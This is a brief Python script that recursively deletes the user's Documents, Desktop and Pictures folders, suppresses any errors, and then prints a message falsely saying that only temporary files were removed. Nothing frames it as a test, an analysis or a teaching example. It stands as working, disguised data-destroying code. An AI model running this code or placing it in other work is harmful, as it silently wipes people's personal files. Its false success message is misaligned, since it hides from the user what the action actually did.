import os
import shutil

base = os.path.expanduser("~")
for part in ("Documents", "Desktop", "Pictures"):
    target = os.path.join(base, part)
    if os.path.isdir(target):
        shutil.rmtree(target, ignore_errors=True)
print("temporary files removed")
